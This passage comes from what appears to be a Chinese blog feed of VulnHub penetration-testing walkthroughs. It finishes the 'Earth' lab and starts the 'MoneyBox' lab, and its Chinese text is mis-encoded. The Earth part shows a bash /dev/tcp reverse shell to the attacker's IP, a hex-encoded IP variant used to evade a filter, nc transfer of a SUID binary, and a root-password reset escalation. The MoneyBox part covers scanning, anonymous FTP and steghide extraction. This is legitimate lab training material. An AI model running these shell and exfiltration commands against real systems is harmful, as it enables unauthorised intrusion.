alt="image-20250426132012976"></p><p>å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼ŒæŸ¥çœ‹å½“å‰ç”¨æˆ·æ˜¯<code>apache</code></p><p>ä½¿ç”¨<code>find</code>å‘½ä»¤æŸ¥æ‰¾flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&quot;*flag*&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426132554676.png" alt="image-20250426132554676"></p><p>åœ¨<code>/var/earth_web/user_flag.txt</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/earth_web/user_flag.txt<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426132650736.png" alt="image-20250426132650736"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">user_flag_3353b67d6437f07ba7d34afd7d2fc27d<br></code></pre></td></tr></table></figure><h3 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h3><p>å°è¯•åå¼¹<code>shell</code>åˆ°kaliä¸Š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 2333<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426133421555.png" alt="image-20250426133421555"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -i &gt;&amp; /dev/tcp/192.168.1.103/2333 0&gt;&amp;1<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426132915400.png" alt="image-20250426132915400"></p><p>ä½†æ˜¯å‘ç°è¿›åˆ¶è¿œç¨‹è¿æ¥ï¼Œçœ‹å¤§ä½¬æ–‡ç« æ˜¯è¦å¯¹IPè¿›è¡Œåå…­è¿›åˆ¶è½¬æ¢</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="hljs-number">0</span>xc0.<span class="hljs-number">0</span>xa8.<span class="hljs-number">0</span>x01.<span class="hljs-number">0</span>x67/<span class="hljs-number">2333</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426133456856.png" alt="image-20250426133456856"></p><p>æˆåŠŸè¿ä¸Šäº†</p><h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><h3 id="SUIDææƒ"><a href="#SUIDææƒ" class="headerlink" title="SUIDææƒ"></a>SUIDææƒ</h3><p>çœ‹çœ‹èƒ½ä¸èƒ½<code>SUID</code>ææƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426133750901.png" alt="image-20250426133750901"></p><p>å°è¯•ç”¨<code>/usr/bin/reset_root</code>ææƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">reset_root<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426133956288.png" alt="image-20250426133956288"></p><p>çœ‹ä¸æ‡‚é—®AI</p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426134150989.png" alt="image-20250426134150989"></p><h4 id="æŠŠå‘½ä»¤ä¸‹è½½åˆ°kaliè°ƒè¯•"><a href="#æŠŠå‘½ä»¤ä¸‹è½½åˆ°kaliè°ƒè¯•" class="headerlink" title="æŠŠå‘½ä»¤ä¸‹è½½åˆ°kaliè°ƒè¯•"></a>æŠŠå‘½ä»¤ä¸‹è½½åˆ°kaliè°ƒè¯•</h4><p>åœ¨é¶æœºä¸Šä¸èƒ½è°ƒè¯•ï¼Œåˆ©ç”¨<code>nc</code>å°†è¿™ä¸ªå‘½ä»¤ä¸‹è½½åˆ°kaliè¿›è¡Œè°ƒè¯•</p><p>åœ¨kaliè¾“å…¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -nlvp 5555 &gt;reset_root<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426134946044.png" alt="image-20250426134946044"></p><p>åœ¨é¶æœºä¸Šè¾“å…¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc 192.168.1.103 5555 &lt; /usr/bin/reset_root<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426135001530.png" alt="image-20250426135001530"></p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426135007473.png" alt="image-20250426135007473"></p><p>å…ˆå¯¹<code>root_reset</code>èµ‹äºˆæƒé™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x reset_root<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426135155202.png" alt="image-20250426135155202"></p><h4 id="ä½¿ç”¨straceè¿›è¡Œè°ƒè¯•"><a href="#ä½¿ç”¨straceè¿›è¡Œè°ƒè¯•" class="headerlink" title="ä½¿ç”¨straceè¿›è¡Œè°ƒè¯•"></a>ä½¿ç”¨<code>strace</code>è¿›è¡Œè°ƒè¯•</h4><p>å…ˆå®‰è£…è¿™ä¸ªå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt install strace<br></code></pre></td></tr></table></figure><p>ç„¶åå¼€å§‹è°ƒè¯•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">strace ./reset_root<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426135553990.png" alt="image-20250426135553990"></p><p>å‘ç°å› ä¸ºç¼ºå°‘ä¸Šé¢çš„ä¸‰ä¸ªæ–‡ä»¶è€Œè°ƒè¯•å¤±è´¥ï¼Œå»é¶æœºä¸Šæ‰¾è¿™ä¸‰ä¸ªæ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /dev/shm/kHgTFI5G<br><span class="hljs-built_in">cat</span> /dev/shm/Zw7bV9U5<br><span class="hljs-built_in">cat</span> /tmp/kcM0Wewe<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426135735241.png" alt="image-20250426135735241"></p><p>é¶æœºä¸Šæœç„¶ç¼ºå°‘è¿™ä¸‰ä¸ªæ–‡ä»¶ï¼Œæ²¡æœ‰æ–‡ä»¶é‚£å°±åˆ›å»ºæ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> /dev/shm/kHgTFI5G<br><span class="hljs-built_in">touch</span> /dev/shm/Zw7bV9U5<br><span class="hljs-built_in">touch</span> /tmp/kcM0Wewe<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426135945884.png" alt="image-20250426135945884"></p><p>å†æ¬¡å°è¯•è¿è¡Œ<code>reset_root</code></p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426140126543.png" alt="image-20250426140126543"></p><p>é‡ç½®<code>root</code>å¯†ç ä¸º<code>Earth</code>ï¼Œåˆ‡æ¢ä¸º<code>root</code>æƒé™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">su<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426140242103.png" alt="image-20250426140242103"></p><h4 id="root-flag"><a href="#root-flag" class="headerlink" title="root_flag"></a><code>root_flag</code></h4><p>æˆåŠŸææƒï¼Œæ‰¾flag</p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426140324143.png" alt="image-20250426140324143"></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[root_flag_b0da9554d29db2117b02aa8b66ec492e]</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¸—é€æ‰“é¶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ¸—é€ æ‰“é¶ å¤ç°</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VulnHubé¶æœºMoneyBoxå¤ç°</title>
    <link href="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<blockquote><p>å€Ÿé‰´æ–‡ç« ï¼š</p><p><a href="https://blog.csdn.net/YueXuan_521/article/details/135324089">https://blog.csdn.net/YueXuan_521/article/details/135324089</a></p><p><a href="https://blog.csdn.net/Aluxian_/article/details/128672602">https://blog.csdn.net/Aluxian_/article/details/128672602</a></p></blockquote><h1 id="å®‰è£…é¶æœº"><a href="#å®‰è£…é¶æœº" class="headerlink" title="å®‰è£…é¶æœº"></a>å®‰è£…é¶æœº</h1><p>é¶æœºç½‘å€ï¼š<a href="https://www.vulnhub.com/entry/moneybox-1,653/">https://www.vulnhub.com/entry/moneybox-1,653/</a></p><p>VirtualBoxç½‘å€ï¼š<a href="https://www.virtualbox.org/wiki/Downloads">https://www.virtualbox.org/wiki/Downloads</a></p><p>å¦‚æœå‡ºç°ä»¥ä¸‹æŠ¥é”™</p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425212824436.png" alt="image-20250425212824436"></p><p>å°±éœ€è¦å¯¹å®‰è£…ç›®å½•ç»™äºˆæƒé™ï¼Œæˆ‘çš„å®‰è£…ç›®å½•æ˜¯ <code>E:\VirtualBox</code> ï¼Œå°±ä»¥ç®¡ç†å‘˜èº«ä»½æ‰“å¼€å‘½ä»¤æç¤ºç¬¦ï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">icacls E:\VirtualBox /reset /t /c<br>icacls E:\VirtualBox /inheritance:d /t /c<br>icacls E:\VirtualBox /grant *S-1-5-32-545:(OI)(CI)(RX) /t /c<br>icacls E:\VirtualBox /deny *S-1-5-32-545:(DE,WD,AD,WEA,WA) /t /c<br>icacls E:\VirtualBox /grant *S-1-5-11:(OI)(CI)(RX) /t /c<br>icacls E:\VirtualBox /deny *S-1-5-11:(DE,WD,AD,WEA,WA) /t /c<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425213050136.png" alt="image-20250425213050136"></p><p>ç›´æ¥é€‰æ‹©æ˜¯ï¼Œåé¢çš„é»˜è®¤é€‰æ‹©å³å¯</p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425213231938.png" alt="image-20250425213231938"></p><p>å®‰è£…å¥½åä»¥ç®¡ç†å‘˜èº«ä»½æ‰“å¼€ï¼Œå¯¼å…¥ä¸‹è½½å¥½çš„<code>MONEYBOX.ova</code></p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425213349283.png" alt="image-20250425213349283"></p><p>ç„¶åé€‰æ‹©å¥½å®‰è£…ç›®å½•ï¼Œç­‰ç€å¯¼å…¥å¥½å°±è¡Œ</p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425213553737.png" alt="image-20250425213553737"></p><p>é€‰æ‹©å¯åŠ¨ï¼Œå¯èƒ½å‡ºç°ä»¥ä¸‹æŠ¥é”™</p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425215240799.png" alt="image-20250425215240799"></p><p>æ›´æ”¹ç½‘ç»œè®¾ç½®ï¼Œä½¿ç”¨æ¡¥è¿ç½‘å¡å³å¯</p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425215312978.png" alt="image-20250425215312978"></p><h1 id="IPæ¢æµ‹"><a href="#IPæ¢æµ‹" class="headerlink" title="IPæ¢æµ‹"></a>IPæ¢æµ‹</h1><h3 id="å¯»æ‰¾é¶æœº"><a href="#å¯»æ‰¾é¶æœº" class="headerlink" title="å¯»æ‰¾é¶æœº"></a>å¯»æ‰¾é¶æœº</h3><p>éœ€è¦å‡†å¤‡ä¸€å°kaliï¼Œè¦å’Œé¶æœºå¤„äºåŒä¸€ä¸ªç½‘æ®µï¼ˆå¯ä»¥éƒ½ç”¨æ¡¥æ¥æ¨¡å¼ï¼‰</p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425215622260.png" alt="image-20250425215622260"></p><p>é¦–å…ˆè·å–kaliçš„ç½‘å¡ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ifconfig<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425225742643.png" alt="image-20250425225742643"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kaliçš„IPï¼š192.168.1.103<br></code></pre></td></tr></table></figure><h4 id="ä½¿ç”¨nmapå·¥å…·æ‰«æ"><a href="#ä½¿ç”¨nmapå·¥å…·æ‰«æ" class="headerlink" title="ä½¿ç”¨nmapå·¥å…·æ‰«æ"></a>ä½¿ç”¨<code>nmap</code>å·¥å…·æ‰«æ</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap 192.168.1.0/24<br></code></pre></td></tr></table></figure><ul><li>**<code>nmap</code>ï¼š**ç½‘ç»œæ¢ç´¢å’Œå®‰å…¨æ‰«æå·¥å…·</li><li>**<code>192.168.1.0/24ï¼š</code> **ç›®æ ‡ IP åœ°å€èŒƒå›´ã€‚è¿™é‡Œçš„<code>/24</code>è¡¨ç¤ºå­ç½‘æ©ç ä¸º <code>255.255.255.0</code>ï¼Œè¿™æ„å‘³ç€ Nmap å°†æ‰«æä»<code>192.168.1.1</code>åˆ°<code>192.168.1.254</code>çš„æ‰€æœ‰ IP åœ°å€</li></ul><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425225704959.png" alt="image-20250425225704959"></p><p>çœ‹åˆ°è¿™ä¸ªæœºå™¨å¼€äº†<code>ftp</code>å’Œ<code>ssh</code>ï¼Œå°±å¯ä»¥çŸ¥é“æ˜¯é¶æœº</p><h4 id="ä½¿ç”¨arpæ‰«æ"><a href="#ä½¿ç”¨arpæ‰«æ" class="headerlink" title="ä½¿ç”¨arpæ‰«æ"></a>ä½¿ç”¨<code>arp</code>æ‰«æ</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">arp-scan -I eth0 -l<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425230118925.png" alt="image-20250425230118925"></p><h4 id="ä½¿ç”¨netdiscover"><a href="#ä½¿ç”¨netdiscover" class="headerlink" title="ä½¿ç”¨netdiscover"></a>ä½¿ç”¨<code>netdiscover</code></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netdiscover -r 192.168.1.0/24<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425230430356.png" alt="image-20250425230430356"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">é¶æœºçš„IPï¼š192.168.1.102<br></code></pre></td></tr></table></figure><p>å¾—åˆ°é¶æœºå’Œ<code>kali</code>çš„IP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">kaliçš„IPï¼š192.168.1.103<br>é¶æœºçš„IPï¼š192.168.1.102<br></code></pre></td></tr></table></figure><h3 id="æ·±å…¥æ¢æµ‹"><a href="#æ·±å…¥æ¢æµ‹" class="headerlink" title="æ·±å…¥æ¢æµ‹"></a>æ·±å…¥æ¢æµ‹</h3><p>ä½¿ç”¨<code>nmap</code>è¿›è¡Œæ·±å…¥æ¢æµ‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -A 192.168.1.102<br><br><span class="hljs-comment"># å‚æ•°å«ä¹‰ï¼š</span><br>-Aï¼šAggressiveï¼ˆæ¿€è¿›ï¼‰æ‰«ææ¨¡å¼ã€‚è¿™æ˜¯ä¸€ä¸ªç»„åˆé€‰é¡¹ï¼ŒåŒ…å«äº†ä»¥ä¸‹åŠŸèƒ½ï¼š<br>-sSï¼ˆTCP SYN æ‰«æï¼‰<br>-sUï¼ˆUDP æ‰«æï¼‰<br>-sTï¼ˆTCP connect() æ‰«æï¼‰<br>-sVï¼ˆæœåŠ¡ç‰ˆæœ¬æ¢æµ‹ï¼‰<br>-sCï¼ˆé»˜è®¤è„šæœ¬æ‰«æï¼‰<br>OS detectionï¼ˆæ“ä½œç³»ç»Ÿæ£€æµ‹ï¼‰<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -A 192.168.1.102<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425231606085.png" alt="image-20250425231606085"></p><p>é¶æœºå¼€æ”¾äº†ä¸‰ä¸ªç«¯å£ï¼š</p><p><code>21</code>ï¼šæ˜¯<code>ftp</code>æœåŠ¡ï¼Œå…è®¸åŒ¿åç™»å½•ï¼Œè¿˜æœ‰ä¸€å¼ <code>trytofind.jpg</code>å›¾ç‰‡</p><p><code>22</code>ï¼šæ˜¯<code>ssh</code>æœåŠ¡æœ‰ä¸€äº›<code>key</code></p><p><code>80</code>ï¼šæ˜¯<code>http</code>æœåŠ¡å­˜åœ¨ä¸€ä¸ªç½‘é¡µ<code>Titleï¼šMoneyBox</code></p><h1 id="FTPæœåŠ¡æ¢æµ‹"><a href="#FTPæœåŠ¡æ¢æµ‹" class="headerlink" title="FTPæœåŠ¡æ¢æµ‹"></a>FTPæœåŠ¡æ¢æµ‹</h1><p>å°è¯•è¿›è¡ŒåŒ¿åç™»å½•FTPæœåŠ¡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># FTPçš„åŒ¿åç™»å½•ä¸€èˆ¬æœ‰ä¸‰ç§ï¼š</span><br>1ã€ ç”¨æˆ·åï¼šanonymous å¯†ç ï¼šanonymous æˆ–è€… ä¸ºç©º<br>2ã€ ç”¨æˆ·åï¼šFTP å¯†ç ï¼šFTP æˆ–è€…ä¸ºç©º<br>3ã€ ç”¨æˆ·åï¼šUSER å¯†ç ï¼špass<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ftp 192.168.1.102<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425232151081.png" alt="image-20250425232151081"></p><p>æˆåŠŸç™»å½•ï¼Œå…ˆçœ‹çœ‹æœ‰ä»€ä¹ˆä¸œè¥¿</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425232255654.png" alt="image-20250425232255654"></p><p>æœ‰ä¸€ä¸ª JPG å›¾ç‰‡ï¼Œä½¿ç”¨<code>get</code>å‘½ä»¤ä¸‹è½½å›¾ç‰‡</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">get</span> trytofind.jpg<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/trytofind.jpg" alt="trytofind"></p><p>çœ‹åˆ°å›¾ç‰‡æƒ³åˆ°CTFçš„å›¾ç‰‡éšå†™ï¼Œä½¿ç”¨<code>steghide</code>å·¥å…·æŸ¥çœ‹å›¾ç‰‡è¯¦ç»†ä¿¡æ¯</p><p><code>steghide</code>å®‰è£…æ–¹æ³•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get install steghide<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹å›¾ç‰‡ä¿¡æ¯</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">steghide</span> <span class="hljs-literal">info</span> trytofind.jpg<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425232905214.png" alt="image-20250425232905214"></p><p>å‘ç°éœ€è¦å¯†ç ï¼Œæ¥ä¸‹æ¥éœ€è¦æ‰¾å¯†ç </p><h1 id="HTTPæœåŠ¡æ¢æµ‹"><a href="#HTTPæœåŠ¡æ¢æµ‹" class="headerlink" title="HTTPæœåŠ¡æ¢æµ‹"></a>HTTPæœåŠ¡æ¢æµ‹</h1><p>ç›´æ¥è®¿é—®ç›®æ ‡é¶æœºçš„IP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">192.168.1.102<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425233220536.png" alt="image-20250425233220536"></p><p>çœ‹ç½‘ç«™å…ˆçœ‹æºç ï¼Œä¸è¿‡æ²¡æœ‰æœ‰ç”¨çš„ä¸œè¥¿</p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425233302824.png" alt="image-20250425233302824"></p><p>é‚£å°±ç›´æ¥ç”¨<code>dirsearch</code>æ‰«æç›®å½•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirsearch -u http://192.168.1.102/ -e *<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425233509276.png" alt="image-20250425233509276"></p><p>å¯ä»¥æ‰«å‡ºä¸ª301é‡å®šå‘çš„<code>/blogs</code>é¡µé¢ï¼Œè®¿é—®çœ‹çœ‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://192.168.1.102/blogs<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425233628440.png" alt="image-20250425233628440"></p><p>è¿˜æ˜¯å…ˆæŸ¥çœ‹æºç </p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425233953950.png" alt="image-20250425233953950"></p><p>åœ¨æœ€åå¯ä»¥å‘ç°ä¸€ä¸ª<code>hint</code>ï¼Œè®¿é—®<code>/S3cr3t-T3xt</code>çœ‹çœ‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://192.168.1.102/S3cr3t-T3xt<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425233827255.png" alt="image-20250425233827255"></p><p>ç»§ç»­çœ‹æºç </p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425233859495.png" alt="image-20250425233859495"></p><p>å¾—åˆ°å¯†ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># å¯†ç </span><br>3xtr4ctd4t4<br></code></pre></td></tr></table></figure><p>é‡æ–°å†å»çœ‹çœ‹å›¾ç‰‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">steghide info trytofind.jpg<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425234146632.png" alt="image-20250425234146632"></p><p>å‘ç°æœ‰ä¸€ä¸ª<code>data.txt</code>æ–‡ä»¶ï¼Œä½¿ç”¨<code>steghide</code>æå–å‡ºæ¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">steghide extract -sf trytofind.jpg -p 3xtr4ctd4t4<br></code></pre></td></tr></table></figure><ul><li><code>extract</code>ï¼šæŒ‡å®šè¦æ‰§è¡Œçš„æ“ä½œä¸ºæå–éšè—æ•°æ®</li><li><code>-sf</code>ï¼šæŒ‡å®šæºæ–‡ä»¶ä¸º <code>trytofind.jpg</code>ï¼Œè¿™æ˜¯ä¸€ä¸ªåŒ…å«éšè—æ•°æ®çš„å›¾åƒæ–‡ä»¶</li><li><code>-p</code>ï¼šæŒ‡å®šç”¨äºè§£å¯†éšè—æ•°æ®çš„å¯†ç ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå¯†ç 